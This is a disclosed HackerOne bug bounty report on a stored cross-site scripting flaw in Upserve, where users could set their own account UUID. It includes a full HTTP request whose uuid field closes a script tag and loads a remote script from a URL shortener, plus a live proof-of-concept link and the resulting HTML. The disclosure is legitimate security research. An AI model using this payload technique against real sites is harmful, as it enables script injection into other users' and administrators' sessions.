---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2019-06-10
submitted: 2017-07-13T05:57:02.081Z
bounty_usd: 1500
votes: 207
cve: []
program: "[[programs/upserve|Upserve ]]"
reporter: "cache-money"
source: "https://hackerone.com/reports/249131"
title: "Ability to create own account UUID leads to stored XSS"
---
# Ability to create own account UUID leads to stored XSS

> **Severity:** High | **Bounty:** 1,500 USD | **Votes:** 207 | **Program:** Upserve  | **Disclosed:** 2019-06-10

- Report: [https://hackerone.com/reports/249131](https://hackerone.com/reports/249131)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2017-07-13T05:57:02.081Z

## Report summary

The server allows the client to create and submit its own UUID which was not validated. This resulted in the ability to create a crafted XSS payload.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.

This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.

**PoC**
Just replace the email with the one you own, and click the email confirmation link.
```
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

**Live PoC**
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002

The generated HTML looks like:
`YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,`

Thanks,
-- Tanner

## Timeline

- **Report Filed**
- **2017-07-13** @cache-money: Also since I used that UUID you probably won't be able to replicate with that request. You can try this one I just created to the same file: `//is.gd/Xu8ZR8`
- **Report Needs More Info**
- **Report New**
- **2017-07-14** @joystick: Hi,

Thank you for the additional information. We were able to reproduce the issue.

Regards.
- **Report Triaged**
- **Bounty Awarded**
- **2017-07-20** @cache-money: Thanks team :)
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Changed Scope**
